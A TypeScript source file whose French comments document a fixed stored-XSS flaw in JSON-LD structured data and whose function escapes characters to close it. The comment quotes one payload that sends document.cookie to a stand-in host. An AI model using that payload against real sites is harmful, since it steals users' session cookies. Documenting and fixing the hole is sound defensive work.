/**
 * Les donnees structurees, ecrites dans la page sans pouvoir en sortir.
 *
 * ── LA FAILLE QUE CE FICHIER FERME ────────────────────────────────────────
 *
 * Le balisage schema.org part dans un `<script type="application/ld+json">`,
 * pose par `dangerouslySetInnerHTML` — il n'y a pas d'autre facon de le faire
 * en React. Le contenu venait de `JSON.stringify()` seul.
 *
 * OR `JSON.stringify` N'ECHAPPE NI `<` NI `/`. Ce n'est pas une lacune : son
 * travail est de produire du JSON valide, et `</script>` en est. C'est
 * l'analyseur HTML qui, lui, ferme la balise au premier `</script` venu, sans
 * savoir qu'il se trouve dans une chaine JSON.
 *
 * Reproduit le 26 aout 2026 sur le rendu reel : avec un nom de boutique valant
 *
 *     Chez X</script><script>new Image().src='//ailleurs/'+document.cookie</script>
 *
 * la balise se refermait au 126e caractere d'une sortie qui en comptait 233.
 * Tout ce qui suivait s'executait sur l'origine de la plateforme.
 *
 * ── POURQUOI C'ETAIT GRAVE ICI, ET PAS AILLEURS ───────────────────────────
 *
 * Le nom, le slug et la description d'une boutique sont ecrits par le MARCHAND
 * lui-meme, depuis « Ma boutique », directement en base — `authenticated`
 * detient `UPDATE` sur ces trois colonnes, et l'inscription est libre. Il n'y
 * avait donc aucun administrateur a compromettre : n'importe quel inscrit
 * posait le code, et il s'executait chez qui ouvrait sa vitrine.
 *
 * Deux choses en aggravaient la portee, et toutes deux sont ecrites ailleurs
 * dans ce depot :
 *   - les cookies de session NE SONT PAS `httpOnly` et ne peuvent pas l'etre,
 *     le client navigateur devant les lire (voir `supabase.ts`) ;
 *   - la CSP est posee en `Content-Security-Policy-Report-Only` le temps de la
 *     calibrer (voir `next.config.ts`) : elle observe, elle ne bloque pas.
 *
 * ── CE QU'ON ECHAPPE, ET POURQUOI CHACUN ──────────────────────────────────
 *
 * `<` et `>`  ferment ou ouvrent une balise ;
 * `&`         amorce une entite HTML, que le navigateur resout avant nous ;
 * U+2028/2029 sont des fins de ligne pour JavaScript mais pas pour JSON — un
 *             `<script>` qui les contient tels quels devient invalide.
 *
 * Les sequences `\\uXXXX` restent du JSON parfaitement valide : Google lit la
 * meme chose qu'avant, et le navigateur n'y voit plus de balise.
 */
export function jsonLdSur(donnees: unknown): string {
  return JSON.stringify(donnees)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    // ECRITS EN ECHAPPEMENT, JAMAIS EN LITTERAL. Ces deux caracteres sont
    // INVISIBLES dans un editeur : poses tels quels, une edition ulterieure les
    // effacerait sans que personne le voie. Meme precaution que `typeSchema`
    // avec les diacritiques combinants.
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}
